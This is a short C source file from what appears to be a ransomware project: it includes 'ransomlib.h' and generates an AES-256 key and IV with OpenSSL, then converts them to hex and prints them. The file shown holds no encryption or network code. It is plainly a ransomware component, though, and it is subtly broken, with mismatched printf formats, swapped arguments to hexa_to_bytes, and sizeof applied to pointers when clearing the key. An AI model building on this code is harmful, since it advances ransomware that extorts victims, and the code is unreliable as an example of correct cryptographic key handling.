#include "ransomlib.h"
#include <dirent.h> // for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <openssl/rand.h>

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	// Generate cryptographically strong pseudo-random bytes for key and IV 
	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
	{
		// OpenSSL reports a failure, act accordingly 
		fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
		return errno;
	}

	// for(int cpt=0; cpt<sizeKey; cpt++)
	// {
			// printf("%d", key[cpt]);
	// }
	
	// for(int cpt=0; cpt<sizeIv; cpt++)
	// {
			// printf("%ld", iv[cpt]);
	// }
	printf("La clé : %d  l'IV : %d \n",key, iv);
	
	char hex_string[513];
	bytes_to_hexa(key, hex_string,sizeKey);
	printf("ok %X", hex_string);
	
	char bytes_string[513];
	hexa_to_bytes(bytes_string,hex_string,sizeKey);
	printf("okok2 %d", bytes_string);
	
	OPENSSL_cleanse(key,sizeof(key));	
	OPENSSL_cleanse(iv,sizeof(iv));
}

int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
    for (size_t i = 0; i < size; i++) {
        hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
    }
}

void hexa_to_bytes(char hex_string[], unsigned char val[], int size)
{
    char *pos = hex_string;

    for (size_t count = 0; count < size; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }
}

int main ()
{
	// Key to use for encrpytion and decryption 
	unsigned char key[AES_256_KEY_SIZE+1];
	// Initialization Vector 
	unsigned char iv[AES_BLOCK_SIZE+1];

	int sizeKey = AES_256_KEY_SIZE; 
	int sizeIv = AES_BLOCK_SIZE;
	
	unsigned char pKey[AES_256_KEY_SIZE+1];
	unsigned char pIv[AES_BLOCK_SIZE+1];

	generate_key(key, sizeKey, iv, sizeIv,pKey, pIv);
}
